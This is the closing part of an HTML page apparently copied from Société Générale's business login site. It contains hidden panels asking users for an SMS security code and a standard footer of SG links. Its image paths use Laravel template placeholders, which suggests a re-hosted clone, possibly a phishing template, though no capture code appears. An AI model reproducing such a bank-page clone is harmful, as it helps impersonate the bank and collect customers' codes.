<li>&gt;&gt; <u><a href="https://professionnels.sg.fr/icd-web/syd-front/index-comptes.html#comptes">Espace Client Professionnels (Progéliance Net)</a></u></li>
<li>&gt;&gt; <u><a href="https://particuliers.sg.fr/com/icd-web/cbo/index.html">Espace Client Particuliers</a></u></li>
</ul>
</div>
<!-- #eo2680-oob : le contenu du paragraphe a été copié de swm-content-otp -->

<div id="swm-content-oob" style="display:none">
<div class="eo2680-pass">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="{{ url('/') }}/images/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne</strong>, applicable à toutes les banques, a évoluée afin de renforcer la sécurité de vos données bancaires. La première connexion à votre Espace Client est désormais soumise à une authentification renforcée par la saisie d’un Code Sécurité reçu par SMS ou SVI sur le Téléphone Sécurité que vous avez préalablement déclaré auprès de votre Chargé d’Affaires.</p>
</div>
</div>
</div>
<!-- #eo2680-otp -->

<div id="swm-content-otp" style="display:none">
<div class="eo2680-oob">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img alt="" src="{{ url('/') }}/images/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne</strong>, applicable à toutes les banques, a évoluée afin de renforcer la sécurité de vos données bancaires. La première connexion à votre Espace Client est désormais soumise à une authentification renforcée par la saisie d’un Code Sécurité reçu par SMS ou SVI sur le Téléphone Sécurité que vous avez préalablement déclaré auprès de votre Chargé d’Affaires.</p>
</div>
</div>
</div>

</div>

</div>




</section>
<section class="dcw_gb_row dcw_gb_clearfix">
</section>
</section>
</main>



















<div>

<div>
    <!-- ENT - footer-disconnected,footer-int-without-closing-main 7 disclaimer global-empty  -->

</div>

</div>




<aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#info"></use></svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">

</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed">
<svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#close-2"></use></svg>
</button>
</aside><footer class="dcw_footer" role="contentinfo">
<div class="dcw_footer-second">
<div class="dcw_footer_container">
<nav class="dcw_footer-second_nav">
    <ul class="dcw_footer-second_list">
            <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="/questions-frequentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#question"></use></svg>
Questions fréquentes
</a>    </li>
<li class="dcw_footer-second_item">
                <div class="dcw_dropdown js-dropdown-light">
<button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites SG</button>
<svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#arrow-dropdown"></use></svg>
<ul class="dcw_dropdown_list toggle_content">
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://particuliers.sg.fr/">Particuliers</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://privatebanking.societegenerale.com/fr">Banque Privée</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://professionnels.sg.fr/">Professionnels</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://associations.sg.fr/">Associations</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://economiepublique.sg.fr/">Économie publique</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://banque.sg.fr/">Découvrir SG</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.societegenerale.com/fr">Le groupe Société Générale</a>
</li>
</ul>
</div></li>
        </ul>
</nav>
<ul class="dcw_footer_container dcw_footer-second_social">
        <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Suivez-nous sur Facebook" href="http://www.facebook.com/sgetvous">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#facebook-2"></use></svg>
</a>    </li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Suivez-nous sur Twitter" href="http://twitter.com/SGEntrepreneurs">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#twitter-2"></use></svg>
</a>    </li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Suivez-nous sur Linkedin" href="https://www.linkedin.com/showcase/sgentrepreneurs">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#linkedin-2"></use></svg>
</a>    </li>
</ul>
</div>
</div>
<nav class="dcw_footer-third">
<div class="dcw_footer_container">
<a href="https://www.societegenerale.com"><img alt="Page d'accueil - SG" class="dcw_footer-third_logo" height="30" src="{{ url('/') }}/images/logo-sg-seul.svg" width="150"></a>

<ul class="dcw_footer-third_list">
        <li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/assistance">Assistance</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/fraude-et-securite">Sécurité</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/nos-engagements">Nos engagements</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/charte-cookies-sg">Gestion des Cookies</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/rgpd-charte-donnees-societe-generale">Données personnelles</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/informations-legales">Informations légales</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/accessibilitenumerique">Accessibilité Numérique (partiellement conforme)</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/plan-du-site">Plan du site</a>
</li>
</ul>
</div>
</nav>
<aside class="dcw_msg-banner-supervision dcw_msg-banner-supervision--info" role="alert" id="supervision" style="display:none">
<div class="dcw_msg-banner-supervision_msg-wrapper">
<svg class="dcw_msg-banner-supervision_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#info"></use></svg>
<p class="dcw_msg-banner-supervision_message" id="supervisionMessage">

</p>
<button arial-label="Ignorer les parcours obligatoires" class="dcw_msg-banner-supervision_button" id="byPassButton">
Ignorer les parcours obligatoires
</button>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner-supervision_btn-close" id="Supervision_Close_Btn">
<svg class="dcw_msg-banner-supervision_btn-close_picto" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#arrow-dropdown"></use></svg>
</button>        
</div>
</aside></footer>
<!-- URL: https://entreprises.sg.fr/restcontent/regions/f1d9112f38323710VgnVCM1000000ae1c6c0RCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: f1d9112f38323710VgnVCM1000000ae1c6c0RCRD, regionNames: gb9-com2-int,gb9-com4-int,footer-int-without-closing-main, FURL_NAME: /ent/authen/footer, FURL_ID: ae1a112f38323710VgnVCM1000000ae1c6c0RCRD -->






</body></html>